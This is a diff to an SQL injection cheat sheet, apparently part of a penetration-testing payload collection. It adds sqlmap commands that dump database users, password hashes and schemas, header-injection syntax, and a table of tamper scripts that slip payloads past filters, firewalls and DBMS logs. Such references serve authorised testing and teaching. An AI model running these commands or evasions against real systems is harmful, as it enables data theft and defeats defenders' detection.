@@ -1,10 +1,6 @@
 # SQL injection
 A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application	
 
-## SQL injection using SQLmap
-```
-sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
-```
 
 ## Entry point detection
 Detection of an SQL injection entry point
@@ -25,6 +21,72 @@ transformed into U+0022 QUOTATION MARK (")
 Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
 transformed into U+0027 APOSTROPHE (')
 ```
+
+
+
+## SQL injection using SQLmap
+Basic arguments for SQLmap
+```
+sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
+```
+
+Custom injection in UserAgent/Header/Referer/Cookie
+```
+python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
+```
+
+General tamper option and tamper's list
+```
+tamper=name_of_the_tamper
+```
+
+| Tamper | Description |
+| --- | --- |
+|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart | 
+|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart| 
+|appendnullbyte.py | Appends encoded NULL byte character at the end of payload | 
+|base64encode.py | Base64 all characters in a given payload  | 
+|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' | 
+|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  | 
+|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) | 
+|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'| 
+|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'| 
+|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'| 
+|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  | 
+|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  | 
+|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  | 
+|escapequotes.py | Slash escape quotes (' and ") | 
+|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart | 
+|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  | 
+|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'| 
+|modsecurityversioned.py | Embraces complete query with versioned comment | 
+|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment | 
+|multiplespaces.py | Adds multiple spaces around SQL keywords | 
+|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters| 
+|percentage.py | Adds a percentage sign ('%') infront of each character  | 
+|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) | 
+|randomcase.py | Replaces each keyword character with random case value | 
+|randomcomments.py | Add random comments to SQL keywords| 
+|securesphere.py | Appends special crafted string| 
+|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs | 
+|space2comment.py | Replaces space character (' ') with comments | 
+|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') | 
+|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') | 
+|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') | 
+|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters | 
+|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') | 
+|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters | 
+|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') | 
+|space2plus.py |  Replaces space character (' ') with plus ('+')  | 
+|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters | 
+|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) | 
+|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT | 
+|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) | 
+|uppercase.py | Replaces each keyword character with upper case value 'INSERT'| 
+|varnish.py | Append a HTTP header 'X-originating-IP' | 
+|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment | 
+|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
+|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
 
 ## Authentication bypass 
 ```
@@ -166,3 +228,4 @@ WHERE -> HAVING
   - [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
   - [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
   - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
+  - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
